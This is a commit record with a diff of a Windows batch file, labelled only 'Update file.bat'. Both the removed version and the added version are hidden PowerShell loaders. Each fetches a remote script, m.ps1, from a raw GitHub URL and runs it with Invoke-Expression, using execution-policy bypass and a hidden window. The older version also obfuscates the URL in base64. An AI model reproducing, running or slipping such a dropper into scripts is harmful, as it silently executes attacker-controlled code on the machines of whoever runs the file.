b5c399fe0088ded12c9de372a6a76fd5bf883391
k53xupn43 <digi2ocean@gmail.com>
2025-07-19 10:19:40 +0600

    Update file.bat

--- file.bat
+++ file.bat
@@ -1,11 +1,5 @@
 @echo off
-setlocal
-
-:: Base64-encoded URL of the PowerShell payload
-set "encodedURL=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2s1M3h1cG40My9pOTY1NjUyZi9yZWZzL2hlYWRzL21haW4vbS5wczE="
-
-:: Run obfuscated PowerShell command silently
-powershell -NoP -W Hidden -Exec Bypass -Command ^
- "$u=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedURL%'));$i='Invoke-Expression';$w='Invoke-RestMethod';&($i) (&($w) ($u))"
-
-endlocal
+setlocal EnableDelayedExpansion
+set "a=iex (irm "
+set "b=https://raw.githubusercontent.com/k53xupn43/i965652f/refs/heads/main/m.ps1)"
+powershell -NoP -Exec Bypass -Window Hidden -Command "!a!!b!"
